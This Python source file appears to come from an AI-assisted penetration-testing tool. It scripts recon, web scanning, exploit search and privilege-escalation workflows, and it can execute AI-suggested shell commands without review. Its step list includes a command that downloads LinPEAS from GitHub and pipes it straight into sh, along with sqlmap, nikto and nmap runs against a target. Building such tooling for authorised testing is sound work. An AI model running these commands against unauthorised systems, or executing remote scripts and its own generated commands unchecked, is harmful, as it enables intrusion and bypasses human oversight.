"""Penetration testing automation workflows."""

import asyncio
from datetime import datetime
from typing import Any, Dict, List, Optional

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from lucifer.core.ai_engine import AIEngine
from lucifer.core.terminal_capture import TerminalCapture
from lucifer.utils.logger import get_logger


class WorkflowStep:
    """Represents a single workflow step."""

    def __init__(
        self,
        name: str,
        command: str,
        description: str,
        timeout: int = 60,
        required: bool = True,
    ):
        """Initialize workflow step."""
        self.name = name
        self.command = command
        self.description = description
        self.timeout = timeout
        self.required = required
        self.output: Optional[str] = None
        self.success: bool = False


class PentestWorkflow:
    """Base class for penetration testing workflows."""

    def __init__(
        self,
        name: str,
        description: str,
        ai_engine: AIEngine,
        terminal_capture: TerminalCapture,
    ):
        """Initialize workflow."""
        self.name = name
        self.description = description
        self.ai_engine = ai_engine
        self.terminal_capture = terminal_capture
        self.console = Console()
        self.logger = get_logger(__name__)
        self.steps: List[WorkflowStep] = []
        self.results: Dict[str, Any] = {}

    def add_step(self, step: WorkflowStep) -> None:
        """Add step to workflow."""
        self.steps.append(step)

    async def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute workflow."""
        self.console.print(f"[bold cyan]Executing workflow: {self.name}[/bold cyan]")
        self.console.print(f"[dim]{self.description}[/dim]\n")

        self.results = {
            "workflow": self.name,
            "start_time": datetime.now().isoformat(),
            "steps": [],
            "context": context,
        }

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            for step in self.steps:
                task = progress.add_task(f"[cyan]{step.name}...", total=1)

                try:
                    # Execute step
                    await self._execute_step(step, context)
                    progress.update(task, completed=1)

                    # Record result
                    self.results["steps"].append({
                        "name": step.name,
                        "command": step.command,
                        "success": step.success,
                        "output": step.output,
                    })

                    # If required step failed, stop workflow
                    if step.required and not step.success:
                        self.console.print(
                            f"[red]Required step '{step.name}' failed, stopping workflow[/red]"
                        )
                        break

                except Exception as e:
                    self.logger.error(f"Step '{step.name}' error: {e}")
                    self.results["steps"].append({
                        "name": step.name,
                        "error": str(e),
                    })
                    if step.required:
                        break

        self.results["end_time"] = datetime.now().isoformat()
        return self.results

    async def _execute_step(self, step: WorkflowStep, context: Dict[str, Any]) -> None:
        """Execute a single step."""
        # Format command with context
        command = step.command.format(**context)

        self.logger.info(f"Executing: {command}")
        self.console.print(f"  [yellow]Running: {command}[/yellow]")

        # Send command to terminal
        self.terminal_capture.send_command(command)

        # Wait for output
        await asyncio.sleep(step.timeout)

        # Get output
        step.output = self.terminal_capture.get_recent_output(lines=50)
        step.success = True  # Assume success unless we detect errors

        # Check for error indicators
        error_indicators = ["error", "failed", "denied", "not found"]
        if any(ind in step.output.lower() for ind in error_indicators):
            step.success = False


class ReconWorkflow(PentestWorkflow):
    """Reconnaissance workflow."""

    def __init__(self, ai_engine: AIEngine, terminal_capture: TerminalCapture):
        """Initialize recon workflow."""
        super().__init__(
            name="Reconnaissance",
            description="Comprehensive target reconnaissance and enumeration",
            ai_engine=ai_engine,
            terminal_capture=terminal_capture,
        )

        # Add recon steps
        self.add_step(
            WorkflowStep(
                name="Host Discovery",
                command="nmap -sn {target}",
                description="Discover live hosts",
                timeout=30,
            )
        )
        self.add_step(
            WorkflowStep(
                name="Port Scan",
                command="nmap -p- -T4 {target}",
                description="Scan all ports",
                timeout=300,
            )
        )
        self.add_step(
            WorkflowStep(
                name="Service Detection",
                command="nmap -sV -sC -p {ports} {target}",
                description="Detect services and versions",
                timeout=120,
            )
        )
        self.add_step(
            WorkflowStep(
                name="Web Application Scan",
                command="whatweb {target}",
                description="Web technology identification",
                timeout=30,
                required=False,
            )
        )
        self.add_step(
            WorkflowStep(
                name="DNS Enumeration",
                command="dig {target} ANY",
                description="DNS record enumeration",
                timeout=15,
                required=False,
            )
        )


class WebAppWorkflow(PentestWorkflow):
    """Web application testing workflow."""

    def __init__(self, ai_engine: AIEngine, terminal_capture: TerminalCapture):
        """Initialize web app workflow."""
        super().__init__(
            name="Web Application Testing",
            description="Automated web application vulnerability assessment",
            ai_engine=ai_engine,
            terminal_capture=terminal_capture,
        )

        self.add_step(
            WorkflowStep(
                name="Directory Enumeration",
                command="gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt",
                description="Enumerate directories and files",
                timeout=180,
            )
        )
        self.add_step(
            WorkflowStep(
                name="Nikto Scan",
                command="nikto -h {target}",
                description="Web server vulnerability scan",
                timeout=300,
            )
        )
        self.add_step(
            WorkflowStep(
                name="SQL Injection Test",
                command="sqlmap -u {target} --batch --crawl=2",
                description="Automated SQL injection testing",
                timeout=300,
                required=False,
            )
        )


class ExploitationWorkflow(PentestWorkflow):
    """Exploitation workflow."""

    def __init__(self, ai_engine: AIEngine, terminal_capture: TerminalCapture):
        """Initialize exploitation workflow."""
        super().__init__(
            name="Exploitation",
            description="Automated vulnerability exploitation",
            ai_engine=ai_engine,
            terminal_capture=terminal_capture,
        )

        self.add_step(
            WorkflowStep(
                name="Metasploit Search",
                command='msfconsole -q -x "search {vulnerability}; exit"',
                description="Search for exploits",
                timeout=30,
            )
        )
        self.add_step(
            WorkflowStep(
                name="SearchSploit",
                command="searchsploit {vulnerability}",
                description="Search exploit database",
                timeout=15,
            )
        )


class PrivilegeEscalationWorkflow(PentestWorkflow):
    """Privilege escalation workflow."""

    def __init__(self, ai_engine: AIEngine, terminal_capture: TerminalCapture):
        """Initialize privilege escalation workflow."""
        super().__init__(
            name="Privilege Escalation",
            description="Automated privilege escalation enumeration",
            ai_engine=ai_engine,
            terminal_capture=terminal_capture,
        )

        self.add_step(
            WorkflowStep(
                name="LinPEAS",
                command="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                description="Linux privilege escalation enumeration",
                timeout=120,
                required=False,
            )
        )
        self.add_step(
            WorkflowStep(
                name="SUID Binaries",
                command="find / -perm -4000 -type f 2>/dev/null",
                description="Find SUID binaries",
                timeout=60,
            )
        )
        self.add_step(
            WorkflowStep(
                name="Sudo Permissions",
                command="sudo -l",
                description="Check sudo permissions",
                timeout=10,
            )
        )


class WorkflowManager:
    """Manages and executes penetration testing workflows."""

    def __init__(self, ai_engine: AIEngine, terminal_capture: TerminalCapture):
        """Initialize workflow manager."""
        self.ai_engine = ai_engine
        self.terminal_capture = terminal_capture
        self.console = Console()
        self.workflows: Dict[str, PentestWorkflow] = {}

        # Register default workflows
        self._register_default_workflows()

    def _register_default_workflows(self) -> None:
        """Register default workflows."""
        self.register_workflow("recon", ReconWorkflow(self.ai_engine, self.terminal_capture))
        self.register_workflow("webapp", WebAppWorkflow(self.ai_engine, self.terminal_capture))
        self.register_workflow("exploit", ExploitationWorkflow(self.ai_engine, self.terminal_capture))
        self.register_workflow(
            "privesc", PrivilegeEscalationWorkflow(self.ai_engine, self.terminal_capture)
        )

    def register_workflow(self, name: str, workflow: PentestWorkflow) -> None:
        """Register a workflow."""
        self.workflows[name] = workflow

    def list_workflows(self) -> List[str]:
        """List available workflows."""
        return list(self.workflows.keys())

    async def execute_workflow(
        self, workflow_name: str, context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute a workflow by name."""
        if workflow_name not in self.workflows:
            raise ValueError(f"Workflow '{workflow_name}' not found")

        workflow = self.workflows[workflow_name]
        return await workflow.execute(context)

    async def create_custom_workflow(
        self, target: str, objective: str
    ) -> PentestWorkflow:
        """
        Use AI to create a custom workflow.

        Args:
            target: Target information
            objective: Testing objective

        Returns:
            Custom workflow
        """
        self.console.print("[cyan]Creating custom workflow with AI...[/cyan]")

        # Get AI suggestions for workflow steps
        prompt = f"""Create a penetration testing workflow for:
Target: {target}
Objective: {objective}

Provide 5-10 specific commands in order, with descriptions."""

        suggestions = await self.ai_engine.suggest_next_steps(prompt)

        # Create workflow
        workflow = PentestWorkflow(
            name=f"Custom: {objective}",
            description=f"AI-generated workflow for {target}",
            ai_engine=self.ai_engine,
            terminal_capture=self.terminal_capture,
        )

        # Add steps from AI suggestions
        for i, cmd in enumerate(suggestions):
            workflow.add_step(
                WorkflowStep(
                    name=f"Step {i+1}",
                    command=cmd,
                    description=f"AI suggested: {cmd[:50]}",
                    timeout=60,
                    required=False,
                )
            )

        return workflow
